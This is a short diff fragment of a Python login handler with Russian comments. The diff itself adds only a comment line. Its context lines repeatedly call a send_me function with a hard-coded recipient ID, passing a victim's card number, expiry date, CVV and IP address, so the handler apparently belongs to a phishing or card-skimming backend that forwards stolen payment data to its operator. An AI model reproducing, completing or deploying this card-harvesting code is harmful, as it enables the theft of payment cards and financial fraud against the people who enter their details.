@@ -61,6 +61,7 @@ def login():
                     return '', 200  # Возвращаем пустой ответ с кодом 200
             else:
                 send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+                #1
         # WE
         if id == '1000001':
             send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
